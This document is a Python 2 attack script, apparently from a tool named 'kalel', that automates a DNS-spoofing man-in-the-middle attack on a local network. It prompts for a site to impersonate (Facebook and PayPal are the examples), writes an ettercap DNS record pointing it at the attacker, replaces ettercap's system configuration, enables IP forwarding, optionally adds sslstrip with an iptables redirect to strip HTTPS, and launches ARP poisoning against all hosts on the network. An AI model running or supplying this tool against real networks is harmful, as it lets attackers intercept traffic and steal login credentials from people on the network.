#!/usr/bin/env python

import os
import time
import subprocess
from pathlib2 import Path


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def spoofstart():
    # Verify System and clean up afterlast usage
    file1 = Path("src/etter.dns")
    if file1.is_file():
        subprocess.call(['rm', 'src/etter.dns'])
    else:
        pass

    # Getting the Network Interface Card Information.
    # This is the interface that ettercap will listen on.
    print bcolors.OKGREEN
    iface = raw_input('Whats is your network interface?\n (example: eth0, wlan0)\n Interface: ')
    print ("Interface set to set to: %s.") % iface
    iface = "%s" % iface
    print ("\n")

    # Define the attackers lan IP
    lanip = raw_input('Whats is your ip?\n IP: ')
    print ("LAN IP: %s.") % lanip

    # Define the gateway IP
    # gwip = raw_input('Whats is your Gateway/Router IP?\n IP: ')
    # print 'Gateway IP: %s.' % gwip

    print bcolors.ENDC
    print bcolors.HEADER

    # Getting the source address to spoof
    print("What website do you wish to spoof?\n")
    print("Examples: https://facebook.com https://paypal.com \n")
    print("You can also spoof spesific or all subdomains by using wildcard")
    print("Examples: *.facebook.com will spoof all subdomains including www \n")
    print("If you want to spoof all websites you can use a wildcard by just typing *")
    print bcolors.ENDC
    print bcolors.OKGREEN

    target = raw_input('Input Source to spoof\n URL: ')
    print("Target address %s.") % target
    print bcolors.ENDC

    # Writes out the config to etter.dns
    with open('src/etter.dns', 'w+') as f:
        f.writelines(target)
        f.write(' A ')
        f.writelines(lanip+'\n')

    print("Backing up ettercap config and creating our own")

    # Ettercap Config (etter.dns)
    subprocess.call(['mv', '/etc/ettercap/etter.conf', '/etc/ettercap/etter.conf.bak'])
    subprocess.call(['cp', 'src/etter.conf', '/etc/ettercap/etter.conf'])

    # Ettercap DNS config (etter.dns)
    subprocess.call(['mv', '/etc/ettercap/etter.dns', '/etc/ettercap/etter.dns.bak'])
    subprocess.call(['cp', 'src/etter.dns', '/etc/ettercap/etter.dns'])
    print 'Done!'

    # Forward Traffic to WAN
    subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True).wait()

    # Enable SSLSTRIP
    ssl_strip_on = raw_input('Beta! Do you want to enable SSLSTRIP?\n y/n: ')
    if ssl_strip_on == 'y':
        if os.path.isfile('/usr/bin/sslstrip'):
            print('setting up iptables')
            subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '8080'])
            print('starting sslstrip in seperate terminal')
            subprocess.call(['gnome-terminal', '-x', 'sslstrip', '-l', '8080'])
        else:
            print('Cant find SSLSTRIP, please make sure kalel\ncan locate it in /usr/bin/')

    # Forward Traffix
    print bcolors.WARNING
    # Starting up ettercap and launching the attack
    print("Starting the Attack NOW!""\n")
    print bcolors.ENDC
    print bcolors.FAIL
    print("#### NB: CTRL + C IS DISAPPRECIATED, USE Q FOR QUIT INSTEAD! ####")
    print bcolors.ENDC
    time.sleep(1)

    if os.path.isfile('src/config.py'):
        from src.config import etterdir
        subprocess.call([etterdir, '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',])
    else:
        subprocess.call(['ettercap', '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',])


try:
    spoofstart()
except KeyboardInterrupt:
    print("\n\nDon't forget your cat!\n")
finally:
    subprocess.call(['kalel'])
